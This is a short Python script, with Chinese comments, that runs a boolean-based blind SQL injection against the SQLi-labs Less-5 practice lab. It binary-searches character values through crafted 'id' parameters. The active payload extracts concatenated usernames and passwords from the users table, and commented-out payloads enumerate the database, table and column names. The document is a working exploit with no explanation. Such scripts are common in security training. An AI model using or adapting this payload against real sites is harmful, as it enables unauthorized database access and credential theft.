#!/usr/bin/python3
#本脚本以SQLi-labs Less-5为例
import requests

url = "http://192.168.80.50/sqli/Less-5/index.php"
result = ''

for i in range(1,200):
    s = requests.Session()
    l,r = 32,128
    while l < (r-1):
        m = (l+r) // 2
    #    payload = f"1' and (ascii(substr(database(),{i},1)) = {j}) #" #爆破数据库名
    #    payload = f"1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='数据库名'),{i},1)) = {j}) #" #爆破表名
    #    payload = f"1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='数据表名'),{i},1)) = {j}) #" #爆破字段名
        payload = f"1' and (ascii(substr((select group_concat(concat(username,' ',password)) from users),{i},1)) < {m}) #"
        params = {"id":payload}
        res = s.get(url=url,params=params)
        if "You are in" in res.text:
            r = m
        else:
            l = m
     
    result = result + chr(l)
    #判断是否得到连续三个空格，并以此作为循环退出的依据
    if result[-3:] == '   ':
        break

print(result)
print(i)
